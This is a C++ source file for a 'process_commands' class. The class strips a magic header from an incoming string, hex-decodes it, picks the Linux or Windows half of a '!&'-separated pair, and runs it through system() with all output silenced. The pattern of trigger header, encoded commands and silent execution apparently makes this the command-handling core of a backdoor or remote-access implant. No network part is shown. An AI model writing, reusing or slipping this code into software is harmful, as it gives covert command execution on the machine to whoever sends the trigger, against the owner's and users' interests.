#include "process_commands.h"


process_commands::process_commands(string header, string ecommand) {
	magic_header = header;
	encoded_command = ecommand;
}

void process_commands::strip_header(void) {
	encoded_command = encoded_command.substr(magic_header.size(), encoded_command.size());
}

void process_commands::decode_cmd(void) {
	// https://stackoverflow.com/questions/3790613/how-to-convert-a-string-of-hex-values-to-a-string
	decoded_command = c.hex_decode(encoded_command);
}

void process_commands::execute_cmd(string command) {
	#ifdef __linux__
		system((command + " >/dev/null 2>/dev/null").c_str());
	#elif _WIN32
		system((command + " >nul 2>&1").c_str());
	#else
	#endif
}

string process_commands::get_correct_cmd(void) {
	string seperator = "!&";
	if (decoded_command.find(seperator) != -1) {
		size_t sep_index = decoded_command.find(seperator);
		string windows_command = decoded_command.substr(sep_index + seperator.size(), decoded_command.size());
		string linux_command = decoded_command.substr(0, sep_index);
		#ifdef __linux__
				return linux_command;
		#elif _WIN32
				return windows_command;
		#else
		#endif
	}
	return string();
}